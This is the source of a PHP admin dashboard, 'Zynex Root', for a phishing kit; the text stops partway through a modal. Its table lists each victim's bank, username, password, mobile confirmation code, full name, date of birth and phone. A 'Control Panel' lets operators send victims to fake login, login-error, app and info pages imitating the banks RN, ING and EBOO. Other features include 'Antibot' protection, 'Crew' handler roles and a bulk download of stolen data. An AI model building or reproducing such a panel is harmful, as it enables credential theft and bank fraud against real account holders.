<?php
require_once 'inc/config.php';  // Ensure these paths are correct
require_once 'inc/connect.php';

// Set default timezone
date_default_timezone_set('Europe/Dublin');

// Start session securely
if (session_status() !== PHP_SESSION_ACTIVE) {
    session_start();  // Start session only if not already started
}

// Add HTTP security headers
header('X-Frame-Options: DENY'); // Prevent clickjacking
header('X-Content-Type-Options: nosniff'); // Prevent MIME-type sniffing
header('X-XSS-Protection: 1; mode=block'); // Enable XSS filter in older browsers
header('Referrer-Policy: strict-origin-when-cross-origin'); // Control referrer header

// Check if the user is logged in
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header('Location: login.php');
    exit;
}

// Regenerate session ID to prevent session fixation attacks
if (!isset($_SESSION['regenerated'])) {
    session_regenerate_id(true);
    $_SESSION['regenerated'] = true;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="all,follow">
    <title>Zynex Root - Admin Dashboard</title>
    
    <link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/webkul-micron@1.1.6/dist/css/micron.min.css">
    <link rel="stylesheet" href="css/toastr.min.css">
    <link rel="stylesheet" href="css/flag-icon.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <link rel="icon" type="image/x-icon" href="img/favicon.ico">
    
    <style>
        :root {
            --primary-color: #6366f1;
            --primary-dark: #4f46e5;
            --secondary-color: #8b5cf6;
            --accent-color: #06b6d4;
            --success-color: #10b981;
            --warning-color: #f59e0b;
            --error-color: #ef4444;
            --info-color: #3b82f6;
            
            --dark-bg: #0f172a;
            --darker-bg: #1e293b;
            --card-bg: #1e293b;
            --card-hover: #334155;
            --header-bg: #0f172a;
            
            --text-primary: #ffffff;
            --text-secondary: #e2e8f0;
            --text-muted: #cbd5e1;
            
            --border-color: #334155;
            --border-light: #475569;
            
            --shadow-sm: 0 1px 3px 0 rgba(0, 0, 0, 0.3), 0 1px 2px 0 rgba(0, 0, 0, 0.2);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.3), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.3), 0 4px 6px -2px rgba(0, 0, 0, 0.2);
            --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.4), 0 10px 10px -5px rgba(0, 0, 0, 0.3);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--dark-bg);
            min-height: 100vh;
            color: var(--text-primary);
            overflow-x: hidden;
        }

        .modern-header {
            background: var(--header-bg);
            border-bottom: 1px solid var(--border-color);
            padding: 1.5rem 0;
            top: 0;
            z-index: 1000;
            box-shadow: var(--shadow-lg);
        }

        .header-container {
            width: 100%;
            max-width: none;
            padding: 0 2rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 2rem;
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .logo-section img {
            width: 100px;
            height: 100px;
            border-radius: 12px;
            box-shadow: var(--shadow-sm);
            transition: transform 0.2s ease;
        }

        .logo-section img:hover {
            transform: scale(1.05);
        }

        .support-btn {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
            color: white;
            padding: 1rem 2rem;
            border-radius: 12px;
            text-decoration: none;
            font-weight: 600;
            font-size: 1rem;
            transition: all 0.3s ease;
            box-shadow: var(--shadow-sm);
            display: flex;
            align-items: center;
            gap: 0.75rem;
            border: none;
        }

        .support-btn:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
            color: white;
            text-decoration: none;
        }

        .stats-container {
            width: 100%;
            max-width: none;
            margin: 2rem 0;
            padding: 0 2rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 2rem;
        }

        .stat-card {
            background: var(--card-bg);
            border-radius: 16px;
            padding: 2rem;
            box-shadow: var(--shadow-lg);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            border: 1px solid var(--border-color);
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
        }

        .stat-card:hover {
            transform: translateY(-3px);
            box-shadow: var(--shadow-xl);
            background: var(--card-hover);
        }

        .stat-header {
            display: flex;
            align-items: center;
            gap: 1.5rem;
            margin-bottom: 1rem;
        }

        .stat-icon {
            width: 50px;
            height: 50px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.4rem;
            color: white;
        }

        .stat-icon.visits { background: linear-gradient(135deg, #3b82f6, #1d4ed8); }
        .stat-icon.clients { background: linear-gradient(135deg, #10b981, #059669); }
        .stat-icon.active { background: linear-gradient(135deg, #f59e0b, #d97706); }
        .stat-icon.crews { background: linear-gradient(135deg, #8b5cf6, #7c3aed); }

        .stat-title {
            font-size: 0.9rem;
            font-weight: 600;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .stat-number {
            font-size: 2.5rem;
            font-weight: 800;
            color: var(--text-primary);
            line-height: 1;
        }

        .action-bar {
            width: 100%;
            max-width: none;
            margin: 0 0 2rem;
            padding: 0 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1.5rem;
        }

        .action-buttons {
            display: flex;
            gap: 1rem;
            flex-wrap: wrap;
        }

        .action-btn {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 1rem 1.5rem;
            border-radius: 12px;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            box-shadow: var(--shadow-sm);
        }

        .action-btn:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
            border-color: var(--primary-color);
            background: var(--card-hover);
            color: var(--primary-color);
        }

        .action-btn i {
            font-size: 1.1rem;
        }

        .user-menu {
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .nav-link-modern {
            color: var(--text-primary);
            text-decoration: none;
            padding: 1rem 1.5rem;
            border-radius: 12px;
            font-weight: 600;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            background: var(--card-bg);
            box-shadow: var(--shadow-sm);
            border: 1px solid var(--border-color);
            font-size: 0.9rem;
        }

        .nav-link-modern:hover {
            background: var(--primary-color);
            color: white;
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
            text-decoration: none;
            border-color: var(--primary-color);
        }

        .nav-link-modern i {
            font-size: 1.1rem;
        }

        .main-content {
            width: 100%;
            max-width: none;
            margin: 0;
            padding: 0 2rem 2rem;
        }

        .content-card {
            background: var(--card-bg);
            border-radius: 16px;
            box-shadow: var(--shadow-lg);
            overflow: hidden;
            border: 1px solid var(--border-color);
        }

        .card-header {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            padding: 1.5rem 2rem;
            font-size: 1.2rem;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .card-header i {
            font-size: 1.3rem;
        }

        .table-container {
            overflow-x: auto;
            max-height: 75vh;
        }

        .modern-table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            font-size: 0.9rem;
        }

        .modern-table thead th {
            background: var(--darker-bg);
            color: var(--text-primary);
            font-weight: 700;
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            padding: 1.25rem 1rem;
            text-align: left;
            position: sticky;
            top: 0;
            z-index: 10;
            border-bottom: 2px solid var(--border-color);
        }

        .modern-table tbody tr {
            transition: all 0.2s ease;
            border-bottom: 1px solid var(--border-color);
        }

        .modern-table tbody tr:hover {
            background: var(--card-hover);
        }

        .modern-table tbody td {
            padding: 1rem;
            vertical-align: middle;
            color: var(--text-primary);
            font-weight: 500;
        }

        .table-actions {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
        }

        .btn-action {
            padding: 0.6rem;
            border: none;
            border-radius: 10px;
            font-size: 0.8rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            min-width: 40px;
            height: 40px;
            position: relative;
        }

        .btn-action i {
            font-size: 1rem;
        }

        .control-button {
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            color: white;
            font-size: 0.75rem;
            padding: 0.6rem 0.8rem;
            white-space: nowrap;
            min-width: 100px;
            height: auto;
            gap: 0.5rem;
        }

        .email-button {
            background: linear-gradient(135deg, #10b981, #059669);
            color: white;
            font-size: 0.75rem;
            padding: 0.6rem 0.8rem;
            white-space: nowrap;
            min-width: 100px;
            height: auto;
            gap: 0.5rem;
        }

        .btn-info {
            background: linear-gradient(135deg, #f59e0b, #d97706);
            color: white;
        }

        .btn-download {
            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
            color: white;
        }

        .btn-alert {
            background: linear-gradient(135deg, #f97316, #ea580c);
            color: white;
        }

        .btn-ban {
            background: linear-gradient(135deg, #ef4444, #dc2626);
            color: white;
        }

        .btn-delete {
            background: linear-gradient(135deg, #dc2626, #b91c1c);
            color: white;
        }

        .btn-action:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }

        .modal-content {
            border-radius: 20px;
            border: none;
            box-shadow: var(--shadow-xl);
            background: var(--card-bg);
            color: var(--text-primary);
            overflow: hidden;
        }

        .modal-header {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            border-radius: 20px 20px 0 0;
            padding: 1.5rem 2rem;
            border-bottom: none;
            position: relative;
        }

        .modal-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #ffffff20, #ffffff40, #ffffff20);
        }

        .modal-title {
            font-weight: 700;
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .modal-title::before {
            content: '⚡';
            font-size: 1.6rem;
        }

        .modal-body {
            background: var(--card-bg);
            min-height: 250px;
        }

        .close {
            color: white;
            opacity: 1;
            font-size: 2rem;
            font-weight: 300;
            text-shadow: none;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            width: 45px;
            height: 45px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .close:hover {
            color: white;
            opacity: 1;
            background: rgba(255, 255, 255, 0.2);
            transform: rotate(90deg);
        }

        .button {
            background: linear-gradient(135deg, var(--card-hover), var(--darker-bg));
            color: var(--text-primary);
            border: 2px solid var(--border-color);
            padding: 1rem 1.5rem;
            border-radius: 12px;
            font-weight: 600;
            font-size: 0.9rem;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            text-align: center;
            min-height: 50px;
        }

        .button:hover {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
            color: white;
            border-color: var(--primary-color);
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
        }

        .error-button {
            border-color: var(--error-color);
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.2), rgba(220, 38, 38, 0.2));
            color: #ff6b6b;
        }

        .error-button:hover {
            background: linear-gradient(135deg, var(--error-color), #dc2626);
            border-color: var(--error-color);
            color: white;
        }

        .finish-button {
            border-color: var(--success-color);
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(5, 150, 105, 0.2));
            color: #4ade80;
        }

        .finish-button:hover {
            background: linear-gradient(135deg, var(--success-color), #059669);
            border-color: var(--success-color);
            color: white;
        }

        .email-group {
            margin-bottom: 2rem;
        }

        .provider-header {
            background: linear-gradient(135deg, var(--darker-bg), var(--card-hover));
            color: var(--text-primary);
            padding: 1.25rem 1.5rem;
            border-radius: 12px 12px 0 0;
            font-weight: 700;
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            gap: 1rem;
            border: 2px solid var(--border-color);
            border-bottom: none;
        }

        .email-buttons {
            background: var(--card-bg);
            border: 2px solid var(--border-color);
            border-top: none;
            border-radius: 0 0 12px 12px;
            padding: 1.5rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            gap: 1rem;
        }

        @media (max-width: 768px) {
            .header-container {
                padding: 0 1rem;
                flex-direction: column;
                text-align: center;
                gap: 1rem;
            }

            .stats-container {
                padding: 0 1rem;
                grid-template-columns: 1fr;
                gap: 1rem;
            }

            .action-bar {
                padding: 0 1rem;
                flex-direction: column;
                align-items: stretch;
                gap: 1rem;
            }

            .action-buttons {
                justify-content: center;
                width: 100%;
            }

            .action-btn {
                flex: 1;
                min-width: 140px;
            }

            .user-menu {
                width: 100%;
                justify-content: center;
            }

            .nav-link-modern {
                flex: 1;
                justify-content: center;
                min-width: 110px;
            }

            .main-content {
                padding: 0 1rem 2rem;
            }

            .modern-table thead {
                display: none;
            }

            .modern-table tbody tr {
                display: block;
                background: var(--card-bg);
                border-radius: 12px;
                margin-bottom: 1rem;
                padding: 1rem;
                box-shadow: var(--shadow-sm);
                border: 1px solid var(--border-color);
            }

            .modern-table tbody td {
                display: block;
                padding: 0.75rem 0;
                border-bottom: 1px solid var(--border-color);
                color: var(--text-primary) !important;
            }

            .modern-table tbody td:last-child {
                border-bottom: none;
            }

            .modern-table tbody td:nth-child(1)::before { content: "ID: "; }
            .modern-table tbody td:nth-child(2)::before { content: "Ping: "; }
            .modern-table tbody td:nth-child(3)::before { content: "IP: "; }
            .modern-table tbody td:nth-child(4)::before { content: "Country: "; }
            .modern-table tbody td:nth-child(5)::before { content: "BANK: "; }
            .modern-table tbody td:nth-child(6)::before { content: "USER : "; }
			.modern-table tbody td:nth-child(7)::before { content: "PASSWORD: "; }
			.modern-table tbody td:nth-child(8)::before { content: "MobileConfirm: "; }
			.modern-table tbody td:nth-child(9)::before { content: "FullName: "; }
			.modern-table tbody td:nth-child(10)::before { content: "DOB: "; }
			.modern-table tbody td:nth-child(11)::before { content: "PHONE: "; }
            .modern-table tbody td:nth-child(12)::before { content: "Status: "; }
            .modern-table tbody td:nth-child(13)::before { content: "Action: "; }

            .modern-table tbody td::before {
                font-weight: 700;
                color: var(--primary-color);
                display: inline-block;
                width: 100px;
                margin-bottom: 4px;
                font-size: 0.8rem;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }

            .table-actions {
                display: flex;
                flex-direction: column;
                gap: 0.75rem;
                margin-top: 1rem;
            }

            .control-button,
            .email-button {
                width: 100%;
                justify-content: center;
                padding: 1rem 1.5rem;
                font-size: 0.9rem;
                min-height: 50px;
                white-space: normal;
                line-height: 1.3;
                display: flex;
                align-items: center;
                gap: 0.75rem;
            }

            .btn-action {
                width: 100%;
                justify-content: center;
                padding: 0.9rem;
                font-size: 0.85rem;
                min-height: 45px;
                margin-bottom: 0.5rem;
            }

            .email-buttons {
                grid-template-columns: 1fr;
            }

            #redirect-buttons {
                grid-template-columns: 1fr !important;
            }
        }

        .clickable-cell {
            cursor: pointer;
            transition: all 0.2s ease;
            border-radius: 8px;
            padding: 0.5rem 0.75rem !important;
            margin: 0.1rem;
            display: inline-block;
            min-width: 70px;
            background: rgba(99, 102, 241, 0.1);
            border: 1px solid rgba(99, 102, 241, 0.2);
            color: var(--text-primary) !important;
        }

        .clickable-cell:hover {
            background: var(--primary-color);
            color: white !important;
            transform: scale(1.02);
            border-color: var(--primary-color);
        }

        .status-badge {
            padding: 0.5rem 1rem;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-online {
            background: linear-gradient(135deg, #10b981, #059669);
            color: white;
        }

        .status-offline {
            background: linear-gradient(135deg, #6b7280, #4b5563);
            color: white;
        }

        .status-after-login {
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            color: white;
        }

        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }

        ::-webkit-scrollbar-track {
            background: var(--darker-bg);
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(135deg, var(--primary-dark), var(--primary-color));
        }

        .loading {
            display: inline-block;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .pulse {
            animation: pulse 0.5s ease-in-out;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }

        .blink_me {
            animation: blinker 1s linear infinite;
        }

        @keyframes blinker {
            50% {
                opacity: 0.5;
            }
        }
		
		.header-buttons {
  display: flex;
  gap: 10px; /* space between Antibot & Support */
}

    </style>
</head>

<body>
<header class="modern-header">
  <div class="header-container">
    <div class="logo-section">
      <a href="index.php">
        <img src="logo.png" alt="Logo">
      </a>
    </div>

    <!-- Group Antibot + Support together -->
    <div class="header-buttons">
      <a href="../protection/admin" class="support-btn">
        <i class="fas fa-shield-alt"></i>
        Antibot
      </a>
      <a href="https://t.me/zynexroot" class="support-btn" target="_blank">
        <i class="fas fa-headset"></i>
        Support
      </a>
    </div>
  </div>
</header>



    <div class="stats-container">
        <div class="stat-card">
            <div class="stat-header">
                <div class="stat-icon visits">
                    <i class="fas fa-chart-line"></i>
                </div>
                <div>
                    <div class="stat-title">Site Visits</div>
                    <div class="stat-number" id="total_visits"><?php echo total_visits($conn); ?></div>
                </div>
            </div>
        </div>

        <div class="stat-card">
            <div class="stat-header">
                <div class="stat-icon clients">
                    <i class="fas fa-users"></i>
                </div>
                <div>
                    <div class="stat-title">Total clients</div>
                    <div class="stat-number" id="total_clients"><?php echo total_clients($conn); ?></div>
                </div>
            </div>
        </div>

        <div class="stat-card">
            <div class="stat-header">
                <div class="stat-icon active">
                    <i class="fas fa-user-check"></i>
                </div>
                <div>
                    <div class="stat-title">Active clients</div>
                    <div class="stat-number" id="online_clients"><?php echo online_clients($conn); ?></div>
                </div>
            </div>
        </div>

        <div class="stat-card">
            <div class="stat-header">
                <div class="stat-icon crews">
                    <i class="fas fa-user-shield"></i>
                </div>
                <div>
                    <div class="stat-title">Current Crews</div>
                    <div class="stat-number" id="active_handlers"><?php echo online_handlers($conn); ?></div>
                </div>
            </div>
        </div>
    </div>

    <div class="action-bar">
        <div class="action-buttons">
            <button class="action-btn" onclick="reset_bans();" title="Reset Bans">
                <i class="fas fa-recycle"></i>
                Reset Bans
            </button>
            <button class="action-btn" onclick="reset_visits();" title="Reset Visits">
                <i class="fas fa-globe"></i>
                Reset Visits
            </button>
            <button class="action-btn" onclick="wipe();" title="Wipe Logs">
                <i class="fas fa-trash"></i>
                Wipe Logs
            </button>
            <button class="action-btn" onclick="pause_all_alerts();" title="Pause All Alerts">
                <i class="fas fa-bell-slash"></i>
                Pause Alerts
            </button>
            <button class="action-btn" onclick="saveAll();" title="Download All Data">
                <i class="fas fa-download"></i>
                Download All
            </button>
        </div>

        <div class="user-menu">
            <?php
            if (session_status() === PHP_SESSION_NONE) {
                session_start();
            }

            if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true && $_SESSION['role'] !== 'Handler') {
            ?>
                <a href="settings.php" class="nav-link-modern">
                    <i class="fas fa-cog"></i>
                    Settings
                </a>
                <a href="crew.php" class="nav-link-modern">
                    <i class="fas fa-users"></i>
                    Crew
                </a>
            <?php
            }
            ?>
            <a href="logout.php" class="nav-link-modern">
                <i class="fas fa-sign-out-alt"></i>
                Logout
            </a>
        </div>
    </div>

    <div class="main-content">
        <div class="content-card">
            <div class="card-header">
                <i class="fas fa-table"></i>
                clients Management Dashboard
            </div>
            
            <div class="table-container">
                <table class="modern-table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Ping</th>
                            <th>IP</th>
                            <th>Country</th>
                            <th>BANK</th>
                            <th>USER</th>
							<th>PASSWORD</th>
							<th>MobileConfirm</th>
							<th>FullName</th>
							<th>DOB</th>
							<th>PHONE</th>
                            <th>Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="clients_table">
                        <?php
                        $query = mysqli_query($conn, "SELECT * from clients");
                        if ($query) {
                            if (mysqli_num_rows($query) >= 1) {
                                $array = array_filter(mysqli_fetch_all($query, MYSQLI_ASSOC));
                            }
                        }

$redirects = "
<button type='button'
        class='btn-action control-button'
        data-rowid='rowCHANGE_TO_ID'
        onclick=\"pause(); lockRow(this); showRedirectModal('CHANGE_TO_ID');\">
    🏠 Control Panel
</button>


";

$btns = "
<td style='vertical-align:middle;' data-label='Actions'>
  <div class='table-actions'>
    CHANGE_TO_REDIRECTS

    <button class='btn-action btn-info'
            type='button'
            data-rowid='rowCHANGE_TO_ID'
            data-toggle='modal'
            data-target='#myModal'
            onclick='pause(); lockRow(this); show_info(\"CHANGE_TO_ID\");'
            title='Show Details'>
      <i class='fas fa-info'></i>
    </button>

    <button class='btn-action btn-download'
            type='button'
            data-rowid='rowCHANGE_TO_ID'
            onclick='pause(); lockRow(this); save(\"CHANGE_TO_ID\");'
            title='Download'>
      <i class='fas fa-download'></i>
    </button>

    <button class='btn-action btn-alert'
            type='button'
            data-rowid='rowCHANGE_TO_ID'
            onclick='pause(); lockRow(this); pause_alert(\"CHANGE_TO_ID\");'
            title='Silent Alert'>
      <i class='fas fa-bell-slash'></i>
    </button>

    <button class='btn-action btn-ban'
            type='button'
            data-rowid='rowCHANGE_TO_ID'
            onclick='pause(); lockRow(this); ban(\"CHANGE_TO_ID\");'
            title='Ban'>
      <i class='fas fa-ban'></i>
    </button>

    <button class='btn-action btn-delete'
            type='button'
            data-rowid='rowCHANGE_TO_ID'
            onclick='pause(); lockRow(this); remove(\"CHANGE_TO_ID\");'
            title='Delete'>
      <i class='fas fa-trash'></i>
    </button>
  </div>
</td>
";

                        ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

<div id="myModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content">
      
      <div class="modal-header">
        <h5 class="modal-title" id="infomodaltitle">Victim Information</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      
      <div class="modal-body">
        <div id="infomodalvalue" class="info-box"></div>
      </div>

    </div>
  </div>
</div>



<div class="modal fade" id="redirectModal" tabindex="-1" aria-labelledby="redirectModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-xl">
        <div class="modal-content">

            <div class="modal-header">
                <h5 class="modal-title" id="redirectModalLabel">
                    Select Redirect Action
                </h5>

                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>

            <div class="modal-body">

                <div id="redirect-buttons"></div>

            </div>

        </div>
    </div>
</div>


<style>
.redirect-group {
    margin-bottom: 24px;
}

.redirect-group-title {
    font-size: 16px;
    font-weight: 700;
    margin-bottom: 10px;
    padding-bottom: 7px;
    border-bottom: 1px solid #ddd;
}

.redirect-group-buttons {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
    gap: 10px;
}

.redirect-global {
    margin-top: 8px;
    padding-top: 20px;
    border-top: 2px solid #ddd;
}

.redirect-global-title {
    font-size: 16px;
    font-weight: 700;
    margin-bottom: 10px;
}

@media (max-width: 600px) {

    .redirect-group-buttons {
        grid-template-columns: repeat(2, 1fr);
    }

}
</style>


<script>
let redirectModalInstance = null;


function showRedirectModal(id) {

    redirectModalInstance =
        new bootstrap.Modal(
            document.getElementById('redirectModal')
        );

    const container =
        document.getElementById('redirect-buttons');

    container.innerHTML = '';


    /*
     * =========================
     * REDIRECT GROUPS
     * =========================
     */
    const groups = [

        {
            title: 'RN',
            buttons: [
                { txt: 'Login',       code: 1 },
                { txt: 'Login Error', code: 3 },
                { txt: 'APP',         code: 5 },
                { txt: 'Info',        code: 7 }
            ]
        },

        {
            title: 'ING',
            buttons: [
                { txt: 'Login',       code: 9 },
                { txt: 'Login Error', code: 11 },
                { txt: 'APP',         code: 13 },
                { txt: 'Info',        code: 15 }
            ]
        },

        {
            title: 'EBOO',
            buttons: [
                { txt: 'Login',       code: 17 },
                { txt: 'Login Error', code: 19 },
                { txt: 'APP',         code: 21 },
                { txt: 'Info',        code: 23 }
            ]
        }

    ];


    /*
     * Create one normal redirect button
     */
    function createRedirectButton(b) {

        const btn =
            document.createElement('button');

        btn.className =
            'button fit-text-button btn-action'
            + (b.txt.includes('Error')
                ? ' error-button'
                : '')
            + (b.finish
                ? ' finish-button'
                : '');


        btn.type = 'button';

        btn.setAttribute(
            'data-id',
            id
        );


        if (b.code !== undefined) {

            btn.setAttribute(
                'data-sts',
                String(b.code)
            );
        }


        if (b.parm !== undefined) {

            btn.setAttribute(
                'data-parm',
                String(b.parm)
            );
        }


        btn.title = b.txt;

        btn.innerHTML =
            '<span>' + b.txt + '</span>';


        /*
         * Normal redirect action:
         * existing router handles data-id/data-sts
         */
        btn.addEventListener(
            'click',
            function () {

                if (redirectModalInstance) {
                    redirectModalInstance.hide();
                }

            }
        );


        return btn;
    }


    /*
     * =========================
     * BUILD RN / ING / EBOO
     * =========================
     */
    groups.forEach(function(group) {

        const groupBox =
            document.createElement('div');

        groupBox.className =
            'redirect-group';


        const title =
            document.createElement('div');

        title.className =
            'redirect-group-title';

        title.textContent =
            group.title;


        const buttonsBox =
            document.createElement('div');

        buttonsBox.className =
            'redirect-group-buttons';


        group.buttons.forEach(function(b) {

            buttonsBox.appendChild(
                createRedirectButton(b)
            );

        });


        groupBox.appendChild(title);

        groupBox.appendChild(buttonsBox);

        container.appendChild(groupBox);

    });


    /*
     * =========================
     * GLOBAL ACTIONS
     * Only shown ONCE
     * =========================
     */
    const globalBox =
        document.createElement('div');

    globalBox.className =
        'redirect-global';


    const globalTitle =
        document.createElement('div');

    globalTitle.className =
        'redirect-global-title';

    globalTitle.textContent =
        'Other Actions';


    const globalButtons =
        document.createElement('div');

    globalButtons.className =
        'redirect-group-buttons';


    /*
     * CUSTOM REDIRECT
     */
    const customBtn =
        document.createElement('button');

    customBtn.type = 'button';

    customBtn.className =
        'button fit-text-button btn-action';

    customBtn.title =
        'Redirect Custom';

    customBtn.innerHTML =
        '<span>Redirect Custom</span>';

    customBtn.addEventListener(
        'click',
        function () {

            setCustomRedirect();

        }
    );


    /*
     * FINAL REDIRECT / DONE
     * status = 0
     */
    const finishBtn =
        document.createElement('button');

    finishBtn.type = 'button';

    finishBtn.className =
        'button fit-text-button btn-action finish-button';

    finishBtn.setAttribute(
        'data-id',
        id
    );

    finishBtn.setAttribute(
        'data-sts',
        '0'
    );

    finishBtn.title =
        'Redirect';

    finishBtn.innerHTML =
        '<span>Redirect</span>';


    finishBtn.addEventListener(
        'click',
        function () {

            if (redirectModalInstance) {
                redirectModalInstance.hide();
            }

        }
    );


    globalButtons.appendChild(
        customBtn
    );

    globalButtons.appendChild(
        finishBtn
    );


    globalBox.appendChild(
        globalTitle
    );

    globalBox.appendChild(
        globalButtons
    );


    container.appendChild(
        globalBox
    );


    redirectModalInstance.show();
}


/*
 * Keep your existing double parameter function
 */
function command_doubleparm(id, sts, callback) {

    resume();

    var phone =
        prompt("Enter phone number:");

    if (
        phone === null ||
        phone.trim() === ""
    ) {

        if (callback) {
            callback(false);
        }

        return;
    }


    var email =
        prompt("Enter email address:");

    if (
        email === null ||
        email.trim() === ""
    ) {

        if (callback) {
            callback(false);
        }

        return;
    }


    const data =
        new URLSearchParams({

            userid: id,
            status: sts,
            enterphone: phone.trim(),
            enteremail: email.trim()

        });


    fetch(
        'inc/action.php?type=enter_phone_email',
        {
            method: 'POST',

            headers: {
                'Content-Type':
                    'application/x-www-form-urlencoded'
            },

            body: data.toString()
        }
    )

    .then(function(r) {

        return r.ok
            ? r.json()
            : Promise.reject(
                new Error(
                    'HTTP ' + r.status
                )
            );

    })

    .then(function(j) {

        if (callback) {

            callback(
                j &&
                j.status === 'ok'
            );

        }

    })

    .catch(function() {

        if (callback) {
            callback(false);
        }

    });
}
</script>

    <div class="modal fade" id="secondModal" tabindex="-1" aria-labelledby="secondModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-xl">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="secondModalLabel">Select Email Provider Action</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body" id="second-buttons">
                    <div class="email-group">
                        <div class="provider-header gmail">
                            <i class="fab fa-google"></i>
                            Gmail
                        </div>
                        <div class="email-buttons" id="group-gmail"></div>
                    </div>

                    <div class="email-group">
                        <div class="provider-header yahoo">
                            <i class="fab fa-yahoo"></i>
                            Yahoo
                        </div>
                        <div class="email-buttons" id="group-yahoo"></div>
                    </div>

                    <div class="email-group">
                        <div class="provider-header aol">
                            <i class="fas fa-at"></i>
